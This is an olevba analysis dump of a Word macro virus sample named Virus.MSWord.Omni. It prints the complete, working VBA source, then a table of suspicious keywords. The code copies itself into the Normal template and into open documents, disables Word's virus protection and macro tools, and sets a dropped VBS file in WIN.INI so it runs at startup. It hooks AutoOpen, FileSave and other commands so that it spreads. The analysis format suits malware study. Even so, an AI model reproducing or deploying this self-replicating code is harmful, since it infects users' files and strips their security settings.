olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Omni
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.Omni 
in file: Virus.MSWord.Omni - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Rem barok CABINET.CbrAdN v0.11 < LUCEAT LUX VESTRA >
Rem by: Cbrhck /Ranuya, John /cabinet_cbradn@yahoo.com
Rem ' CARAGA, Philippines - " The Place To Be "
Rem Rundate: 3/11/03 10:02:08 AM
'Dedicated to Theri Borillo of Batangas City
'Thanks for your presence - <Take a bunch of Care>
'Cbrhck love you!
'-----------------------------------------------------------------

'PUBLIC INFORMATION:
   
'  This is my World Denomination.
'  Dedicated to all Filipinoes, "MABUHAY! PILIPINAS"
'  Let it copy itself for you.

Option Explicit
Public wrd, windir, f, cbrh, getokSAVE

Rem getSTART
 If InitVBS And GetIn <> 2 Then wrd.OnTime Now + TimeValue("00:00:02"), "getQUIT", 0
 Set wrd = Nothing
 WScript.Quit
Rem getEND

Function InitVBS()
 Dim wsh, i, j, fl, alg, txt, ini
 On Error Resume Next
 InitVBS = False
 Set wsh = WScript.Application
 alg = wsh.ScriptFullName
 windir = getWindir
If Err Or windir = "" Then Exit Function
 Set f = CreateObject("Scripting.FileSystemObject")
 txt = readTxt(alg, True)
 alg = f.buildpath(windir, "CABINET_CbrAdN.vbs")
 writeTxt alg, txt
 i = InStr(txt, "Rem getSTART")
 j = InStr(txt, "Rem getEND")
 cbrh = Left(txt, i - 1) + "Sub getSTART() '" + CStr(Now) + vbCrLf
 cbrh = cbrh + Mid(txt, i, j - i) + "end sub 'getEND" + vbCrLf + Mid(txt, j)
 insertINI
 InitVBS = True
End Function

Function getWindir()
 Dim wshl, env
 On Error Resume Next
 Set wshl = CreateObject("Wscript.Shell")
 Set env = wshl.Environment("PROCESS")
 getWindir = env("WINDIR")
 Set wshl = Nothing
 Set env = Nothing
 If Err Then getWindir = ""
End Function

Function readTxt(alg, delete)
 Dim f, fl, txt, i
 On Error Resume Next
 Set f = CreateObject("Scripting.FileSystemObject")
 alg = UCase(alg)
 Set fl = f.getfile(alg)
 fl.Attributes = 0
 On Error Resume Next
 Set fl = f.OpenTextFile(alg, 1)
 txt = fl.readall
 For i = 0 To 9
  If Asc(Mid(txt, Len(txt), 1)) < 32 Then txt = Mid(txt, 1, Len(txt) - 1) Else Exit For
 Next
 If Err Then readTxt = "" Else readTxt = txt
 fl.Close
 If delete Then f.deletefile alg, True
End Function

Function writeTxt(alg, txt)
 Dim f, fl
 On Error Resume Next
 Set f = CreateObject("Scripting.FileSystemObject")
 alg = UCase(alg)
 Set fl = f.getfile(alg)
 fl.Attributes = 0
 On Error Resume Next
 writeTxt = True
 Set fl = f.createtextfile(alg, True)
 fl.write txt
 fl.Close
 If Err Then writeTxt = False
End Function

Function insertINI()
 Dim alg, txt, ini, i, j
 insertINI = False
 On Error Resume Next
 Set f = CreateObject("Scripting.FileSystemObject")
 alg = f.buildpath(windir, "WIN.INI")
 txt = readTxt(alg, True)
 If txt = "" Then Exit Function
 ini = UCase(txt)
 i = InStr(ini, vbLf + "SHELL=")
 j = InStr(i + 1, ini, vbLf)
 writeTxt alg, Mid(txt, 1, i) + "shell=" + f.buildpath(windir, "CABINET_CbrAdN.vbs") + Mid(txt, j - 1)
 If Err Then Exit Function
 insertINI = True
End Function

Function GetIn()
 Dim recent, d, alg
 On Error Resume Next
 Set wrd = CreateObject("Word.Application")
 wrd.WordBasic.disableautomacros
 GetIn = 2
 If Err Then Exit Function
 Set recent = wrd.RecentFiles
 If recent.Maximum = 0 Then recent.Maximum = 4
 wrd.DisplayAlerts = 0
 If recent.Count <> 0 And InStr(recent(1).Name, ".doc") > 1 Then
  alg = recent(1).Path + wrd.PathSeparator + recent(1).Name
  wrd.WordBasic.SetAttr alg, 0
  Set recent = wrd.Documents.Open(alg)
 End If
 If Err Then
  On Error Resume Next
  recent(1).delete
 End If
 getINFECT
 getSAVE
 GetIn = 1
 If Err Then Exit Function
 GetIn = 0
End Function

Sub getQUIT()
 Application.Quit
End Sub

Sub getINFECT()
 Dim d, docs
 wrd.Options.VirusProtection = False
 wrd.Options.SaveNormalPrompt = False
 Set docs = wrd.Documents
 getgoINFECT wrd.NormalTemplate
 For Each d In docs
  If Not d.ReadOnly And (InStr(d.FullName, ".doc") > 1 Or InStr(d.FullName, ".dot") > 1) Then getgoINFECT d
 Next
End Sub

Sub getgoINFECT(d)
 On Error Resume Next
 Dim comps, c, wala, n, tmp
 Set comps = d.VBProject.VBComponents
 n = ""
 wala = True
 For Each c In comps
  If c.Type = 1 Then
   tmp = c.CodeModule.Lines(1, c.CodeModule.CountOfLines + 1)
   If InStr(tmp, "c.CodeModule.AddFromString(cbrh)") > 99 Then
    wala = False
   Else
    n = c.Name
    comps.Remove c
   End If
  End If
 Next
 If n = "" Then n = "CABINET_CbrAdN_v0_11"
 If wala Then
  Set c = comps.Add(1)
  c.CodeModule.AddFromString (cbrh)
  wrd.NormalTemplate.Save
  c.Name = n
  getokSAVE = True
 End If
End Sub

Sub startCABINET_CbrAdN()
 initCABINET_CbrAdN
 chkCABINET_CbrAdN
 getINFECT
End Sub

Sub initCABINET_CbrAdN()
 Dim j, vbcs
 On Error Resume Next
 WordBasic.disableautomacros
 CustomizationContext = NormalTemplate
 FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
 FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
 CommandBars("Tools").Controls("Macro").delete
 CommandBars("Visual Basic").Visible = False
 CommandBars("Visual Basic").Enabled = False
 CommandBars("Control Toolbox").Visible = False
 CommandBars("Control Toolbox").Enabled = False
 getokSAVE = False
 Set wrd = Application
 wrd.Options.VirusProtection = False
 wrd.Options.SaveNormalPrompt = False
 Set vbcs = wrd.MacroContainer.VBProject.VBComponents
 j = vbcs.Count
 cbrh = vbcs(j).CodeModule.Lines(1, vbcs(j).CodeModule.CountOfLines)
End Sub

Function chkCABINET_CbrAdN()
 Dim alg, i, j, txt
 On Error Resume Next
 chkCABINET_CbrAdN = False
 Set f = CreateObject("Scripting.FileSystemObject")
 windir = getWindir
 If Err Or windir = "" Then Exit Function
 alg = f.buildpath(windir, "CABINET_CbrAdN.vbs")
 If f.FileExists(alg) Then
  chkCABINET_CbrAdN = True
 Else
  i = InStr(cbrh, vbLf + "Sub getSTART()")
  j = InStr(i + 1, cbrh, vbLf)
  txt = Mid(cbrh, 1, i - 2) + Mid(cbrh, j - 1)
  i = InStr(txt, vbLf + "End Sub 'getEND")
  j = InStr(i + 1, txt, vbLf)
  txt = Mid(txt, 1, i - 2) + Mid(txt, j - 1)
  writeTxt alg, txt
  insertINI
 End If
 alg = f.buildpath(windir, "OFFITEMS.LOG")
 Set i = f.getfile(alg)
 i.Attributes = 0
 If i.Size > 99999 Then f.deletefile alg, True
 chkCABINET_CbrAdN = True
End Function

Sub getSAVE()
 Dim d
 If getokSAVE Then
  For Each d In wrd.Documents
   If Not d.ReadOnly Then
    d.Save
    d.Close
   Else: d.Close 0
   End If
  Next
  getokSAVE = False
 End If
End Sub

Sub Organizer()
 initCABINET_CbrAdN
End Sub

Sub ToolsOptions()
 On Error Resume Next
 Dialogs(wdDialogToolsOptions).Show
 initCABINET_CbrAdN
End Sub

Sub ToolsMacro()
 initCABINET_CbrAdN
End Sub

Sub ToolsCustomize()
 On Error Resume Next
 Dialogs(wdDialogToolsCustomize).Display
 initCABINET_CbrAdN
End Sub

Sub ToolsCustomizeKeyboard()
 On Error Resume Next
 Dialogs(wdDialogToolsCustomizeKeyboard).Show
 initCABINET_CbrAdN
End Sub

Sub ToolsProofing()
 Dim w
 On Error Resume Next
 For Each w In ActiveDocument.Words
  If w.Text = "Ranuya" Then w.Text = "John"
 Next
 Dialogs(wdDialogToolsSpellingAndGrammar).Show
End Sub

Sub ViewVBCode()
 initCABINET_CbrAdN
End Sub

Sub AutoExec()
 startCABINET_CbrAdN
End Sub

Sub AutoOpen()
 startCABINET_CbrAdN
End Sub

Sub FileOpen()
 On Error Resume Next
 initCABINET_CbrAdN
 getINFECT
 With Dialogs(wdDialogFileOpen)
  .Display
  startCABINET_CbrAdN
  .Execute
 End With
End Sub

Sub FileSave()
 On Error Resume Next
 If ActiveDocument.Path = "" Then
   FileSaveAs
  Else
   If Not ActiveDocument.Saved Then
    initCABINET_CbrAdN
    getINFECT
    ActiveDocument.Save
    chkCABINET_CbrAdN
   End If
 End If
End Sub

Sub FileSaveAs()
 On Error Resume Next
 initCABINET_CbrAdN
 getINFECT
 Dialogs(wdDialogFileSaveAs).Show
 chkCABINET_CbrAdN
End Sub

Sub FileClose()
 On Error Resume Next
 initCABINET_CbrAdN
 getINFECT
 ActiveDocument.Close
End Sub

Sub FileExit()
 On Error Resume Next
 startCABINET_CbrAdN
 getSAVE
 wrd.Quit
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Environment         |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|createtextfile      |May create a text file                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Wscript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |CABINET_CbrAdN.vbs  |Executable file name                         |
+----------+--------------------+---------------------------------------------+

